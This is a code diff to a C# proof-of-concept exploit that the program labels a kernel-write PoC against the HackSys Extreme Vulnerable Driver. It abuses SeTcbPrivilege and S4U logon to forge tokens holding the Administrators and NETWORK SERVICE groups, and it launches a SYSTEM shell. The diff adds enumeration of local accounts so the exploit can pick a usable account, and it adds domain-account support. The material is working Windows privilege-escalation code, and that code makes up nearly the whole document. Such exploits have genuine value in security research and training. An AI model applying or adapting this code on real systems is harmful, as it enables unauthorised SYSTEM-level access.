@@ -4,6 +4,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Security.Principal;
+using System.Collections.Generic;
 
 namespace TcbS4uAssignTokenVariant
 {
@@ -13,6 +14,19 @@ namespace TcbS4uAssignTokenVariant
     {
         // Windows Definition
         // Windows Enum
+        enum COMPUTER_NAME_FORMAT
+        {
+            ComputerNameNetBIOS,
+            ComputerNameDnsHostname,
+            ComputerNameDnsDomain,
+            ComputerNameDnsFullyQualified,
+            ComputerNamePhysicalNetBIOS,
+            ComputerNamePhysicalDnsHostname,
+            ComputerNamePhysicalDnsDomain,
+            ComputerNamePhysicalDnsFullyQualified,
+            ComputerNameMax
+        }
+
         [Flags]
         enum FormatMessageFlags : uint
         {
@@ -114,6 +128,21 @@ namespace TcbS4uAssignTokenVariant
             INTEGRITY_ENABLED = 0x00000040,
             RESOURCE = 0x20000000,
             LOGON_ID = 0xC0000000
+        }
+
+        enum SID_NAME_USE
+        {
+            SidTypeUser = 1,
+            SidTypeGroup,
+            SidTypeDomain,
+            SidTypeAlias,
+            SidTypeWellKnownGroup,
+            SidTypeDeletedAccount,
+            SidTypeInvalid,
+            SidTypeUnknown,
+            SidTypeComputer,
+            SidTypeLabel,
+            SidTypeLogonSession
         }
 
         enum SYSTEM_INFORMATION_CLASS
@@ -383,9 +412,55 @@ namespace TcbS4uAssignTokenVariant
             MaxTokenInfoClass
         }
 
+        [Flags]
+        enum USER_FLAGS : uint
+        {
+            UF_SCRIPT = 0x00000001,
+            UF_ACCOUNTDISABLE = 0x00000002,
+            UF_HOMEDIR_REQUIRED = 0x00000008,
+            UF_LOCKOUT = 0x00000010,
+            UF_PASSWD_NOTREQD = 0x00000020,
+            UF_PASSWD_CANT_CHANGE = 0x00000040,
+            UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000080,
+            UF_TEMP_DUPLICATE_ACCOUNT = 0x00000100,
+            UF_NORMAL_ACCOUNT = 0x00000200,
+            UF_INTERDOMAIN_TRUST_ACCOUNT = 0x00000800,
+            UF_WORKSTATION_TRUST_ACCOUNT = 0x00001000,
+            UF_SERVER_TRUST_ACCOUNT = 0x00002000,
+            UF_DONT_EXPIRE_PASSWD = 0x00010000,
+            UF_MNS_LOGON_ACCOUNT = 0x00020000,
+            UF_SMARTCARD_REQUIRED = 0x00040000,
+            UF_TRUSTED_FOR_DELEGATION = 0x00080000,
+            UF_NOT_DELEGATED = 0x00100000,
+            UF_USE_DES_KEY_ONLY = 0x00200000,
+            UF_DONT_REQUIRE_PREAUTH = 0x00400000,
+            UF_PASSWORD_EXPIRED = 0x00800000,
+            UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x01000000,
+            UF_NO_AUTH_DATA_REQUIRED = 0x02000000,
+            UF_PARTIAL_SECRETS_ACCOUNT = 0x04000000,
+            UF_USE_AES_KEYS = 0x08000000
+        }
+
+        enum USER_INFO_FILTER
+        {
+            INTERDOMAIN_TRUST_ACCOUNT = 0x8,
+            NORMAL_ACCOUNT = 0x2,
+            PROXY_ACCOUNT = 0x4,
+            SERVER_TRUST_ACCOUNT = 0x20,
+            TEMP_DUPLICATE_ACCOUNT = 0x1,
+            WORKSTATION_TRUST_ACCOUNT = 0x10
+        }
+
+        enum USER_PRIVS
+        {
+            GUEST,
+            USER,
+            ADMIN
+        }
+
         // Windows Struct
         [StructLayout(LayoutKind.Sequential)]
-        public struct LSA_STRING
+        struct LSA_STRING
         {
             public ushort Length;
             public ushort MaximumLength;
@@ -648,6 +723,19 @@ namespace TcbS4uAssignTokenVariant
             }
         }
 
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct USER_INFO_1
+        {
+            public string usri1_name;
+            public string usri1_password;
+            public int usri1_password_age;
+            public USER_PRIVS usri1_priv;
+            public string usri1_home_dir;
+            public string usri1_comment;
+            public USER_FLAGS usri1_flags;
+            public string usri1_script_path;
+        }
+
         // Windows API
         /*
          * advapi32.dll
@@ -681,11 +769,21 @@ namespace TcbS4uAssignTokenVariant
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
 
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool LookupAccountSid(
+            string lpSystemName,
+            IntPtr Sid,
+            StringBuilder Name,
+            ref int cchName,
+            StringBuilder ReferencedDomainName,
+            ref int cchReferencedDomainName,
+            out SID_NAME_USE peUse);
+
         [DllImport("advapi32.dll")]
         static extern NTSTATUS LsaClose(IntPtr PolicyHandle);
 
         [DllImport("advapi32")]
-        public static extern int LsaNtStatusToWinError(NTSTATUS ntstatus);
+        static extern int LsaNtStatusToWinError(NTSTATUS ntstatus);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool OpenProcessToken(
@@ -730,6 +828,12 @@ namespace TcbS4uAssignTokenVariant
             int nSize,
             IntPtr Arguments);
 
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool GetComputerNameEx(
+            COMPUTER_NAME_FORMAT NameType,
+            StringBuilder lpBuffer,
+            ref int nSize);
+
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr LocalFree(IntPtr hMem);
 
@@ -740,12 +844,29 @@ namespace TcbS4uAssignTokenVariant
             int processId);
 
         [DllImport("kernel32.dll")]
-        public static extern void SetLastError(int dwErrCode);
+        static extern void SetLastError(int dwErrCode);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint WaitForSingleObject(
             IntPtr hHandle,
             uint dwMilliseconds);
+
+        /*
+         * netapi32.dll
+         */
+        [DllImport("netapi32.dll")]
+        static extern int NetApiBufferFree(IntPtr Buffer);
+
+        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+        static extern int NetUserEnum(
+            string servername,
+            int level,
+            USER_INFO_FILTER filter,
+            out IntPtr bufptr,
+            int prefmaxlen,
+            out int entriesread,
+            out int totalentries,
+            IntPtr resume_handle);
 
         /*
          * ntdll.dll
@@ -789,7 +910,7 @@ namespace TcbS4uAssignTokenVariant
             uint AuthenticationPackage,
             IntPtr AuthenticationInformation,
             uint AuthenticationInformationLength,
-            in TOKEN_GROUPS LocalGroups,
+            IntPtr /* in TOKEN_GROUPS */ LocalGroups,
             in TOKEN_SOURCE SourceContext,
             out IntPtr ProfileBuffer,
             out uint ProfileBufferLength,
@@ -806,10 +927,13 @@ namespace TcbS4uAssignTokenVariant
 
         // Windows Consts
         const NTSTATUS STATUS_SUCCESS = 0;
+        const int ERROR_SUCCESS = 0;
+        const int ERROR_MORE_DATA = 0x000000EA;
         static readonly NTSTATUS STATUS_BUFFER_TOO_SMALL = Convert.ToInt32("0xC0000023", 16);
         static readonly int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         const string MSV1_0_PACKAGE_NAME = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";
+        const string NEGOSSP_NAME = "Negotiate";
 
         // User define Consts
         [Flags]
@@ -896,6 +1020,41 @@ namespace TcbS4uAssignTokenVariant
         }
 
 
+        static bool ConvertSidToAccountName(
+            IntPtr pSid,
+            out string accountName,
+            out string domainName,
+            out SID_NAME_USE sidType)
+        {
+            int nAccountNameLength = 255;
+            int nDomainNameLength = 255;
+            var accountNameBuilder = new StringBuilder(nAccountNameLength);
+            var domainNameBuilder = new StringBuilder(nDomainNameLength);
+            bool status = LookupAccountSid(
+                null,
+                pSid,
+                accountNameBuilder,
+                ref nAccountNameLength,
+                domainNameBuilder,
+                ref nDomainNameLength,
+                out sidType);
+
+            if (status)
+            {
+                accountName = accountNameBuilder.ToString();
+                domainName = domainNameBuilder.ToString();
+            }
+            else
+            {
+                accountName = null;
+                domainName = null;
+                sidType = SID_NAME_USE.SidTypeUnknown;
+            }
+
+            return status;
+        }
+
+
         static bool CreateTokenAssignedShell(IntPtr hToken)
         {
             var startupInfo = new STARTUPINFO
@@ -927,88 +1086,31 @@ namespace TcbS4uAssignTokenVariant
         }
 
 
-        public static IntPtr GetMsvS4uLogonToken(string upn, string domain)
+        static string GetCurrentDomainName()
         {
-            var hS4uLogonToken = IntPtr.Zero;
+            bool status;
+            int nNameLength = 255;
+            string domainName = Environment.UserDomainName;
+            var nameBuilder = new StringBuilder(nNameLength);
 
             do
             {
-                var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
-                var tokenGroups = new TOKEN_GROUPS(5);
+                status = GetComputerNameEx(
+                    COMPUTER_NAME_FORMAT.ComputerNameDnsDomain,
+                    nameBuilder,
+                    ref nNameLength);
 
-                NTSTATUS ntstatus = LsaConnectUntrusted(out IntPtr hLsa);
-
-                if (ntstatus != STATUS_SUCCESS)
+                if (!status)
                 {
-                    SetLastError(LsaNtStatusToWinError(ntstatus));
-                    break;
+                    nameBuilder.Clear();
+                    nameBuilder.Capacity = nNameLength;
                 }
+            } while (Marshal.GetLastWin32Error() == ERROR_MORE_DATA);
 
-                ntstatus = LsaLookupAuthenticationPackage(hLsa, in pkgName, out uint authnPkg);
+            if (status && (nNameLength > 0))
+                domainName = nameBuilder.ToString();
 
-                if (ntstatus != STATUS_SUCCESS)
-                {
-                    LsaClose(hLsa);
-                    SetLastError(LsaNtStatusToWinError(ntstatus));
-                    break;
-                }
-
-                ConvertStringSidToSid("S-1-1-0", out IntPtr pEveryoneSid);
-                ConvertStringSidToSid("S-1-5-11", out IntPtr pAuthenticatedUsersSid);
-                ConvertStringSidToSid("S-1-5-18", out IntPtr pLocalSystemSid);
-                ConvertStringSidToSid("S-1-5-20", out IntPtr pNetworkServiceSid);
-                ConvertStringSidToSid("S-1-5-32-544", out IntPtr pAdminSid);
-
-                tokenGroups.Groups[0].Sid = pEveryoneSid;
-                tokenGroups.Groups[0].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[1].Sid = pAuthenticatedUsersSid;
-                tokenGroups.Groups[1].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[2].Sid = pLocalSystemSid;
-                tokenGroups.Groups[2].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[3].Sid = pNetworkServiceSid;
-                tokenGroups.Groups[3].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[4].Sid = pAdminSid;
-                tokenGroups.Groups[4].Attributes = (int)(SE_GROUP_ATTRIBUTES.OWNER | SE_GROUP_ATTRIBUTES.ENABLED);
-
-                using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
-                {
-                    IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
-                    var originName = new LSA_STRING("S4U");
-                    var tokenSource = new TOKEN_SOURCE("User32");
-                    ntstatus = LsaLogonUser(
-                        hLsa,
-                        in originName,
-                        SECURITY_LOGON_TYPE.Network,
-                        authnPkg,
-                        msv.Buffer,
-                        (uint)msv.Length,
-                        in tokenGroups,
-                        in tokenSource,
-                        out IntPtr ProfileBuffer,
-                        out uint _,
-                        out LUID _,
-                        pTokenBuffer,
-                        out QUOTA_LIMITS _,
-                        out NTSTATUS _);
-                    LsaFreeReturnBuffer(ProfileBuffer);
-                    LsaClose(hLsa);
-
-                    if (ntstatus != STATUS_SUCCESS)
-                        SetLastError(LsaNtStatusToWinError(ntstatus));
-                    else
-                        hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);
-
-                    Marshal.FreeHGlobal(pTokenBuffer);
-                }
-
-                LocalFree(pEveryoneSid);
-                LocalFree(pAuthenticatedUsersSid);
-                LocalFree(pLocalSystemSid);
-                LocalFree(pNetworkServiceSid);
-                LocalFree(pAdminSid);
-            } while (false);
-
-            return hS4uLogonToken;
+            return domainName;
         }
 
 
@@ -1064,6 +1166,213 @@ namespace TcbS4uAssignTokenVariant
             }
 
             return pObject;
+        }
+
+
+        public static bool GetLocalAccounts(out Dictionary<string, bool> localAccounts)
+        {
+            bool status;
+            int error;
+            int nEntrySize = Marshal.SizeOf(typeof(USER_INFO_1));
+            int nMaximumLength = nEntrySize * 0x100;
+            localAccounts = new Dictionary<string, bool>();
+
+            error = NetUserEnum(
+                null,
+                1,
+                USER_INFO_FILTER.NORMAL_ACCOUNT,
+                out IntPtr pDataBuffer,
+                nMaximumLength,
+                out int nEntries,
+                out int _,
+                IntPtr.Zero);
+            status = (error == ERROR_SUCCESS);
+
+            if (status)
+            {
+                IntPtr pEntry;
+                bool available;
+
+                for (var idx = 0; idx < nEntries; idx++)
+                {
+                    if (Environment.Is64BitProcess)
+                        pEntry = new IntPtr(pDataBuffer.ToInt64() + (idx * nEntrySize));
+                    else
+                        pEntry = new IntPtr(pDataBuffer.ToInt32() + (idx * nEntrySize));
+
+                    var entry = (USER_INFO_1)Marshal.PtrToStructure(pEntry, typeof(USER_INFO_1));
+                    available = !((entry.usri1_flags & (USER_FLAGS.UF_ACCOUNTDISABLE | USER_FLAGS.UF_LOCKOUT)) != 0);
+                    localAccounts.Add(entry.usri1_name, available);
+                }
+
+                NetApiBufferFree(pDataBuffer);
+            }
+
+            return status;
+        }
+
+
+        static bool GetS4uLogonAccount(
+            out string upn,
+            out string domain,
+            out LSA_STRING pkgName,
+            out TOKEN_SOURCE tokenSource)
+        {
+            bool status = GetLocalAccounts(out Dictionary<string, bool> localAccounts);
+            upn = null;
+            domain = null;
+            pkgName = new LSA_STRING();
+            tokenSource = new TOKEN_SOURCE();
+
+            if (status)
+            {
+                foreach (var account in localAccounts)
+                {
+                    if (account.Value)
+                    {
+                        upn = account.Key;
+                        domain = Environment.MachineName;
+                        pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
+                        tokenSource = new TOKEN_SOURCE("User32");
+                        break;
+                    }
+                }
+
+                if (string.IsNullOrEmpty(upn))
+                {
+                    var fqdn = GetCurrentDomainName();
+
+                    if (!CompareIgnoreCase(fqdn, Environment.MachineName))
+                    {
+                        upn = Environment.UserName;
+                        domain = fqdn;
+                        pkgName = new LSA_STRING(NEGOSSP_NAME);
+                        tokenSource = new TOKEN_SOURCE("NtLmSsp");
+                    }
+                    else
+                    {
+                        status = false;
+                    }
+                }
+            }
+
+            return status;
+        }
+
+
+        static IntPtr GetS4uLogonToken(
+            string upn,
+            string domain,
+            in LSA_STRING pkgName,
+            in TOKEN_SOURCE tokenSource,
+            List<string> localGroupSids)
+        {
+            var hS4uLogonToken = IntPtr.Zero;
+
+            do
+            {
+                IntPtr pTokenGroups;
+                int nGroupCount = localGroupSids.Count;
+                var nGroupsOffset = Marshal.OffsetOf(typeof(TOKEN_GROUPS), "Groups").ToInt32();
+                var nTokenGroupsSize = nGroupsOffset;
+                var pSidBuffersToLocalFree = new List<IntPtr>();
+                nTokenGroupsSize += (Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES)) * nGroupCount);
+
+                NTSTATUS ntstatus = LsaConnectUntrusted(out IntPtr hLsa);
+
+                if (ntstatus != STATUS_SUCCESS)
+                {
+                    SetLastError(LsaNtStatusToWinError(ntstatus));
+                    break;
+                }
+
+                ntstatus = LsaLookupAuthenticationPackage(hLsa, in pkgName, out uint authnPkg);
+
+                if (ntstatus != STATUS_SUCCESS)
+                {
+                    LsaClose(hLsa);
+                    SetLastError(LsaNtStatusToWinError(ntstatus));
+                    break;
+                }
+
+                if (nGroupCount > 0)
+                {
+                    int nUnitSize = Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));
+                    var attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                    pTokenGroups = Marshal.AllocHGlobal(nTokenGroupsSize);
+                    nGroupCount = 0;
+                    ZeroMemory(pTokenGroups, nTokenGroupsSize);
+
+                    foreach (var stringSid in localGroupSids)
+                    {
+                        if (ConvertStringSidToSid(stringSid, out IntPtr pSid))
+                        {
+                            ConvertSidToAccountName(pSid, out string _, out string _, out SID_NAME_USE sidType);
+
+                            if ((sidType == SID_NAME_USE.SidTypeAlias) ||
+                                (sidType == SID_NAME_USE.SidTypeWellKnownGroup))
+                            {
+                                Marshal.WriteIntPtr(pTokenGroups, (nGroupsOffset + (nGroupCount * nUnitSize)), pSid);
+                                Marshal.WriteInt32(pTokenGroups, (nGroupsOffset + (nGroupCount * nUnitSize) + IntPtr.Size), attributes);
+                                pSidBuffersToLocalFree.Add(pSid);
+                                nGroupCount++;
+                            }
+                        }
+                    }
+
+                    if (nGroupCount == 0)
+                    {
+                        Marshal.FreeHGlobal(pTokenGroups);
+                        pTokenGroups = IntPtr.Zero;
+                    }
+                    else
+                    {
+                        Marshal.WriteInt32(pTokenGroups, nGroupCount);
+                    }
+                }
+                else
+                {
+                    pTokenGroups = IntPtr.Zero;
+                }
+
+                using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
+                {
+                    IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
+                    var originName = new LSA_STRING("S4U");
+                    ntstatus = LsaLogonUser(
+                        hLsa,
+                        in originName,
+                        SECURITY_LOGON_TYPE.Network,
+                        authnPkg,
+                        msv.Buffer,
+                        (uint)msv.Length,
+                        pTokenGroups,
+                        in tokenSource,
+                        out IntPtr ProfileBuffer,
+                        out uint _,
+                        out LUID _,
+                        pTokenBuffer,
+                        out QUOTA_LIMITS _,
+                        out NTSTATUS _);
+                    LsaFreeReturnBuffer(ProfileBuffer);
+                    LsaClose(hLsa);
+
+                    if (ntstatus != STATUS_SUCCESS)
+                        SetLastError(LsaNtStatusToWinError(ntstatus));
+                    else
+                        hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);
+
+                    Marshal.FreeHGlobal(pTokenBuffer);
+                }
+
+                if (pTokenGroups != IntPtr.Zero)
+                    Marshal.FreeHGlobal(pTokenGroups);
+
+                foreach (var pSidBuffer in pSidBuffersToLocalFree)
+                    LocalFree(pSidBuffer);
+            } while (false);
+
+            return hS4uLogonToken;
         }
 
 
@@ -1177,6 +1486,13 @@ namespace TcbS4uAssignTokenVariant
         }
 
 
+        static void ZeroMemory(IntPtr pBuffer, int nLength)
+        {
+            for (var offset = 0; offset < nLength; offset++)
+                Marshal.WriteByte(pBuffer, offset, 0);
+        }
+
+
         static void Main()
         {
             Console.WriteLine("--[ HEVD Kernel Write PoC : SeTcbPrivilege - From S4U Logon to SYSTEM Shell\n");
@@ -1214,6 +1530,10 @@ namespace TcbS4uAssignTokenVariant
                 IntPtr hS4uImpersonateToken;
                 IntPtr hS4uPrimaryToken;
                 string deviceName = @"\\.\HacksysExtremeVulnerableDriver";
+                var extraGroups = new List<string> {
+                    "S-1-5-20",    // NT AUTHORITY\NETWORK SERVICE
+                    "S-1-5-32-544" // BUILTIN\Administrators
+                };
 
                 Console.WriteLine("[>] Trying to open device driver.");
                 Console.WriteLine("    [*] Device Path : {0}", deviceName);
@@ -1256,17 +1576,27 @@ namespace TcbS4uAssignTokenVariant
 
                 Console.WriteLine("[>] Trying to S4U logon.");
 
-                hS4uImpersonateToken = GetMsvS4uLogonToken(Environment.UserName, Environment.UserDomainName);
-                hS4uPrimaryToken = GetMsvS4uLogonToken(Environment.UserName, Environment.UserDomainName);
+                if (GetS4uLogonAccount(
+                    out string upn,
+                    out string domain,
+                    out LSA_STRING pkgName,
+                    out TOKEN_SOURCE tokenSource))
+                {
+                    Console.WriteLine(@"    [*] Account Name : {0}\{1}", domain, upn);
+                }
+                else
+                {
+                    Console.WriteLine("[-] Failed to determin account information for S4U logon.");
+                    break;
+                }
+
+                hS4uImpersonateToken = GetS4uLogonToken(upn, domain, in pkgName, in tokenSource, extraGroups);
+                hS4uPrimaryToken = GetS4uLogonToken(upn, domain, in pkgName, in tokenSource, extraGroups);
 
                 if ((hS4uImpersonateToken == IntPtr.Zero) || (hS4uPrimaryToken == IntPtr.Zero))
                 {
                     Console.WriteLine("[-] Failed to create S4U logon tokens.");
                     Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
-
-                    if (Marshal.GetLastWin32Error() == 0x00000032)
-                        Console.WriteLine("[!] This PoC does not support domain account. Try again with local account.");
-
                     break;
                 }
                 else
